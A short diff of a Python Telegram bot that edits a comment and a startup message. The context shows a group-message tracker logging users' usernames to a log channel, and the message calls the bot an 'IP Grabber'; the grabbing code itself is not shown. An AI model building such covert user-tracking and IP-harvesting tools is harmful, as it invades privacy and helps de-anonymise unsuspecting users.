@@ -38,7 +38,7 @@ async def handle_join_request(client, request):
     except Exception as e:
         print(f"❌ Failed to send PM to {user_id}: {e}")
 
-# Sangmata Tracker (hanya ke LOG CHANNEL)
+# Sangmata Tracker (hanya kirim ke LOG CHANNEL)
 @app.on_message(filters.group)
 async def sangmata_tracker(client, message):
     if not message.from_user:
@@ -82,5 +82,5 @@ async def sangmata_tracker(client, message):
         "username": user.username
     }
 
-print("✅ Advanced IP Grabber + Sangmata Bot is running...")
+print("✅ IP Grabber + Sangmata Bot is running...")
 app.run()
